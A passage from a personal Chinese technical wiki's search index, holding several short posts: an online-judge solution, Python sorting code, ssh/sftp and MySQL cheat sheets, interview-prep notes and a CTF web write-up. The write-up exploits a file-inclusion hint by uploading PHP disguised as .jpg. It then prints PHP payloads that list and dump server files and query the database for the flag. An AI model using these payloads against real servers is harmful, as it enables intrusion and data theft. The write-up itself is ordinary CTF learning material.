values[1] # for v in values: # ans += v clock.append(time_to_minutes(A,B)) X = int(sys.stdin.readline().strip()) line_2 = sys.stdin.readline().strip() values = list(map(int, line_2.split())) class_time = time_to_minutes(values[0], values[1]) ans_ptr = 0 count = 0 for each_clock in clock: if is_this_enough(each_clock,class_time,X): if clock[count] &gt; clock[ans_ptr]: ans_ptr = count count = count + 1 print(results[ans_ptr]) 为什么不用考虑24小时归零的问题？因为题目中表示上课时间是“当天”的。如果是16:10上课，17:17起床，不会被考虑为“可能是前一天的17:17”，而是直接判定为“会迟到”。","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"第三届“百越杯”福建省高校网络空间安全大赛——Do you know upload？","date":"2018-03-29T02:00:00.000Z","path":"wiki/CTF/Web/三届“百越杯”福建省高校网络空间安全大赛——Do-you-know-upload？/","text":"是一道文件上传的题目： 直接传php文件： 注意到网页源代码中的一个提示： 123&lt;!-- include($_GET[&apos;file&apos;]); --&gt; 参照以下两篇文章 https://zhuanlan.zhihu.com/p/29671736 https://zhuanlan.zhihu.com/p/25069779 文件包含有三个要点： （1）include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 （2）include()括号里面的字符串指向要包含的文件。 （3）include()无视文件类型，不管后缀是什么都当做php代码执行。 $_GET[‘file’] 的要点 .com?file=upload/1.jpg $_GET[&apos;file&apos;]拿到一个字符串，传到include($_GET[&apos;file&apos;]);里作为被包含的文件路径。 把hello_world.php后缀改成.jpg,上传hello_world.jpg 首先尝试了菜刀和weevely，不知道为什么连不上。 以下代码用来列出全部文件 1234567891011&lt;?php $dr = @opendir(&apos;./&apos;); if(!$dr) &#123; echo &quot;Error opening the ./ directory!&lt;BR&gt;&quot;; &#125; while(($files[] = readdir($dr)) !== false); print_r($files);?&gt; 用以下代码列出文件内容：123456789101112131415161718192021222324&lt;?php $dr = @opendir(&apos;./&apos;); if(!$dr) &#123; echo &quot;Error opening the ./ directory!&lt;BR&gt;&quot;; &#125; while(($files[] = readdir($dr)) !== false); print_r($files); foreach ($files as $file) &#123; $file_path = &apos;./&apos;.$file; if(file_exists($file_path)) &#123; echo &apos;Reading file &apos;.$file_path; $fp = fopen($file_path,&quot;r&quot;); $str = fread($fp,filesize($file_path));//指定读取大小，这里把整个文件内容读取出来 echo $str = str_replace(&quot;\\r\\n&quot;,&quot;&lt;br /&gt;&quot;,$str); &#125; &#125; ?&gt; 用以下代码查一下’ctf’数据库都有哪些表： 12345678910111213141516171819&lt;?php $con = mysql_connect(&quot;localhost&quot;,&quot;ctf&quot;,&quot;ctfctfctf&quot;); if (!$con) &#123; echo &apos;Could not connect: &apos; . mysql_error(); &#125; mysql_select_db(&quot;mysql&quot;, $con); $result = mysql_query(&quot;select table_name from information_schema.tables where table_schema=&apos;ctf&apos;&quot;); while($row = mysql_fetch_array($result)) &#123; print_r ($row); echo &quot;&lt;br /&gt;&quot;; &#125;?&gt; 结果如下： 用这段代码查看flag： 12345678910111213141516171819&lt;?php $con = mysql_connect(&quot;localhost&quot;,&quot;ctf&quot;,&quot;ctfctfctf&quot;); if (!$con) &#123; echo &apos;Could not connect: &apos; . mysql_error(); &#125; mysql_select_db(&quot;ctf&quot;, $con); $result = mysql_query(&quot;select * from flag&quot;); while($row = mysql_fetch_array($result)) &#123; print_r ($row); echo &quot;&lt;br /&gt;&quot;; &#125;?&gt; 拿到flag： flag{831e0ded-d64f-4851-a48a-d1318c161648}","tags":[],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"http://yoursite.com/categories/CTF/Web/"}]},{"title":"Sorting Algorithm in Python","date":"2018-03-28T08:44:19.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/排序-Sort/Sorting-Algorithm-in-Python/","text":"（1）交换排序 Exchange Sort （1-1）简单的交换排序 Simple Exchange Sort 1234567def simple_exchange_sort_list(list_input): #注意这里都需要用下标，因为需要交换元素的位置 for i in range(len(list_input)): for j in range(i+1, len(list_input)): if list_input[i] &gt; list_input[j]: list_input[i], list_input[j]=list_input[j], list_input[i] return list_input （1-2）冒泡排序 1234567891011def bubble_sort_list(list_input): for i in range(len(list_input)): flag = False # 注意Python中range(start, stop) 包括start，不包括stop for j in range(len(list_input)-1, i): if list_input[j] &lt; list_input[j-1]: list_input[j], list_input[j-1] = list_input[j-1], list_input[j] flag = True if not flag: break return list_input （1-3）快速排序 (1-3-1)总述： 快排采用的是（1）分而治之（2）交换排序 的策略 快排的关键是找轴点 轴点的特点：（1）轴点不一定存在（例：有序序列循环移一位）（2）轴点已就位 快排的核心问题如何高效地交换出轴点 以下PPT来自邓俊辉的《数据结构》 两个不变性 + 平移-&gt;交换 例题：","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"排序-Sort","slug":"数据结构与算法-Data-Structure-and-Algorithm/排序-Sort","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/排序-Sort/"}]},{"title":"ssh和sftp的简单使用","date":"2018-03-23T02:27:49.000Z","path":"wiki/便签-Cheat Sheet/Ubuntu Shell/sh和sftp的简单使用/","text":"(1)ssh ssh USERNAME@IP_ADDRESS ssh root@192.168.1.1 (2)sftp sftp USERNAME@IP_ADDRESS sftp root@192.168.1.1 上传 put FILE_NAME put HelloWorld.cpp 下载 get FILE_NAME get HelloWorld.cpp get -r FOLDER_NAME","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"Ubuntu Shell","slug":"便签-Cheat-Sheet/Ubuntu-Shell","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/Ubuntu-Shell/"}]},{"title":"读书笔记：《剑指Offer》第一章","date":"2018-03-19T07:44:49.000Z","path":"wiki/读书笔记/剑指Offer/读书笔记：剑指Offer/","text":"测试：单元测试。 如何从基本功能测试、边界值测试、性能测试等方面去设计测试用例，从而提高编写高质量代码的能力。 解题的通用思路和方法：把一个大的复杂的问题分解成若干个小的简单的子问题，然后递归地去解决这些子问题。 行为面试与简历：用30秒到1分钟的时间介绍自己的主要学习、工作经历就即可。 简历中描述项目的STAR模型： ● Situation：简短的项目背景，比如项目的规模，开发的软件的功能、目标用户等。 ● Task：自己完成的任务。这个要写详细，要让面试官对自己的工作一目了然。在用词上要注意区分“参与”和“负责”：如果只是加入某一个开发团队写了几行代码就用“负责”，那就很危险。面试官看到简历上应聘者“负责”了某个项目，他可能就会问项目的总体框架设计、核心算法、团队合作等问题。这些问题对于只是简单“参与”的人来说，是很难回答的，会让面试官认为你不诚实，印象分会减去很多。 ● Action：为了完成任务自己做了哪些工作，是怎么做的。这里可以详细介绍。做系统设计的，可以介绍系统架构的特点；做软件开发的，可以写基于什么工具在哪个平台下应用了哪些技术；做软件测试的，可以写是手工测试还是自动化测试，是白盒测试还是黑盒测试等。 ● Result：自己的贡献。这方面的信息可以写得具体些，最好能用数字加以说明。如果是参与功能开发，可以说按时完成了多少功能；如果做优化，可以说性能提高的百分比是多少；如果是维护，可以说修改了多少个Bug。 举个例子，笔者用下面一段话介绍自己在微软Winforms项目组的经历： Winforms是微软.NET中的一个成熟的UI平台（Situation）。本人的工作是在添加少量新功能之外主要负责维护已有的功能（Task）。新的功能主要是让Winforms的控件的风格和Vista、Windows 7的风格保持一致。在维护方面，对于较难的问题我用WinDbg等工具进行调试（Action）。在过去两年中我总共修改了超过200个Bug（Result）。 如果在应聘者的简历中上述4类信息还不够清晰，面试官可能会追问相关的问题。除此之外，面试官针对项目经验最常问的问题还包括如下几个类型： ● 你在该项目中碰到的最大的问题是什么，你是怎么解决的？ ● 从这个项目中你学到了什么？ ● 什么时候会和其他团队成员（包括开发人员、测试人员、设计人员、项目经理等）有什么样的冲突，你们是怎么解决冲突的？ 技能树：“了解”和“熟悉”“了解”指对某一个技术只是上过课或者看过书，但没有做过实际的项目。通常不建议在简历中列出只是肤浅地了解一点的技能，除非这项技术应聘的职位的确需要。【与目标企业相关的技能-&gt;涉猎到】 简历中我们描述技能的掌握程度大部分应该是“熟悉”。如果我们在实际项目中使用某一项技术已经有较长的时间，通过查阅相关的文档可以独立解决大部分问题，我们就熟悉它了。 基本功（1）一两门编程语言 （2）数据结构 链表、树、栈、队列、哈希表 特别是链表和二叉树 链表：插入&amp;删除节点 二叉树：各种遍历方法的循环写法和递归写法 （3）算法 查找、排序 二分查找、归并排序、快速排序 动态规划、贪婪算法 高质量的代码想好测试用例，以应对： 边界条件 特殊输入 错误处理 思考问题举例子模拟操作过程 用图形表示数据结构 分解成简单的子问题，递归解决 优化代码 （1）去掉重复的计算 （2）各种数据结构的优缺点：什么数据容器能用来干什么 （3）常用的算法：能用来干什么+时间复杂度 Soft Skills 看到问题本质 抓住主要矛盾 抽象建模能力 发散思维能力 提问环节准备几个问题： （1）提前了解公司、部门、职位是做什么的 （2）想好自己想做什么（为什么申请这个职位） （3）留心面试官提到的“内部消息”","tags":[],"categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://yoursite.com/categories/读书笔记/"},{"name":"剑指Offer","slug":"读书笔记/剑指Offer","permalink":"http://yoursite.com/categories/读书笔记/剑指Offer/"}]},{"title":"Cleaning Ubuntu","date":"2018-03-12T09:16:30.000Z","path":"wiki/便签-Cheat Sheet/Ubuntu Shell/leaning-Ubuntu/","text":"Three commands to clean Ubuntu regularly: apt-get update apt-get upgrade apt-get autoremove","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"Ubuntu Shell","slug":"便签-Cheat-Sheet/Ubuntu-Shell","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/Ubuntu-Shell/"}]},{"title":"Database to txt","date":"2018-02-18T17:55:57.000Z","path":"wiki/便签-Cheat Sheet/MySQL/Database to txt/","text":"SELECT * FROM video where video_title is not null into outfile &apos;/var/lib/mysql-files/video.txt&apos; FIELDS TERMINATED BY &apos;|&apos; LINES TERMINATED BY &apos;\\r\\n&apos;; 说明： 1.导出文件目录： 修改输出文件名的目录，以便放在指定的位置。如&apos;a.txt&apos;可以改成&apos;./a.txt&apos;或&apos;/a.txt&apos;。 其中&apos;./a.txt&apos;放在c:\\mysql\\data目录下了， 而&apos;/a.txt&apos;文件则放在c:\\目录下了。 select命令认为的当前目录是数据库的存放目录 2.导出数据格式 字段之间的分隔字符，转义字符，包括字符，及记录行分隔字符。列在下面： FIELDS TERMINATED BY &apos;\\t&apos; [OPTIONALLY] ENCLOSED BY &apos;&apos; ESCAPED BY &apos;\\\\&apos; LINES TERMINATED BY &apos;\\n&apos; TERMINATED 表示字段分隔 [OPTIONALLY] ENCLOSED 表示字段用什么字符包括起来， 如果使用了OPTIONALLY则只有CHAR和VERCHAR被包括 ESCAPED 表示当需要转义时用什么作为转义字符 LINES TERMINATED 表示每行记录之间用什么分隔 3.报错：“The MySQL server is running with the –secure-file-priv option so it cannot execute this statement” 解决方法： SHOW VARIABLES LIKE &apos;secure_file_priv&apos;; +------------------+-----------------------+ | Variable_name | Value | +------------------+-----------------------+ | secure_file_priv | /var/lib/mysql-files/ | +------------------+-----------------------+ SELECT * FROM video where video_title is not null into outfile &apos;/var/lib/mysql-files/video.txt&apos; FIELDS TERMINATED BY &apos;|&apos; LINES TERMINATED BY &apos;\\r\\n&apos;;","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"MySQL","slug":"便签-Cheat-Sheet/MySQL","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/MySQL/"}]},{"title":"Add a GitHub Account","date":"2018-02-18T17:55:57.000Z","path":"wiki/便签-Cheat Sheet/GitHub/Add a GitHub account/","text":"(1)Command: ssh-keygen -t rsa -C &quot;email&quot; (2)Save in: /c/Users/User/.ssh/FILE_NAME (3)Edit config: Host PROJECT_NAME HostName github.com PreferredAuthentications publickey IdentityFile ~/.ssh/FILE_NAME (4)Add SSH key to GitHub ~/.ssh/FILE_NAME.pub (5)Test SSH connection: ssh -T git@PROJECT_NAME","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"GitHub","slug":"便签-Cheat-Sheet/GitHub","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/GitHub/"}]},{"title":"Pip Install from GitHub","date":"2018-02-18T17:55:57.000Z","path":"wiki/便签-Cheat Sheet/Python/Pip install from GitHub/","text":"通过pip3 升级安装 github上的包（可以指定从哪个branch安装）： pip3 install --upgrade https://github.com/soimort/you-get/archive/master.zip","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"Python","slug":"便签-Cheat-Sheet/Python","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/Python/"}]},{"title":"Welcome to Xiu's Wiki","date":"2018-02-18T17:55:57.000Z","path":"wiki/index/","text":"这是Xiu的个人 Wiki 站点。 This is Xiu’s personal Wiki site.","tags":[],"categories":[]}]}